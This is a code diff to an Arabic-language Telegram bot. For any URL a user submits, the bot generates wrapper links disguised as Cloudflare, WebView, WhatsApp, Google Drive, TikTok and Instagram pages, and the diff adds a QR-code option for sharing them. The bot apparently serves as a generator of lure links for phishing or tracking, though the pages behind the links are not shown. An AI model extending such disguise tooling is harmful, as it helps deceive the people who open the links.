@@ -461,6 +461,14 @@ bot.on('callback_query', async (q) => {
   }
   if (data.startsWith("reply:"))
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
+
+  if (data.startsWith("qr:")) {
+    const link = decodeURIComponent(data.replace("qr:",""));
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`;
+    return bot.sendPhoto(chatId, qrUrl, { caption: `📷 QR Code\n\n${link}` }).catch(() => {
+      bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
+    });
+  }
 });
 
 bot.on('polling_error', () => {});
@@ -475,9 +483,18 @@ async function createLink(cid, msg) {
     bot.sendChatAction(cid, "typing");
     stats.linksCreated++; saveStats();
     incUserStat(String(cid), 'linksCreated');
+    const cLink  = `${hostURL}/c/${url}`;
+    const wLink  = `${hostURL}/w/${url}`;
+    const waLink = `${hostURL}/wa/${url}`;
+    const dlLink = `${hostURL}/dl/${url}`;
+    const ttLink = `${hostURL}/tt/${url}`;
+    const igLink = `${hostURL}/ig/${url}`;
     bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}\n\n📁 Google Drive:\n${hostURL}/dl/${url}`,
-      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }]] }) }
+      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}`,
+      { reply_markup: JSON.stringify({ inline_keyboard: [
+        [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
+        [{ text:"📷 QR Code للرابط الرئيسي", callback_data:`qr:${encodeURIComponent(cLink)}` }]
+      ] }) }
     );
   } else {
     bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
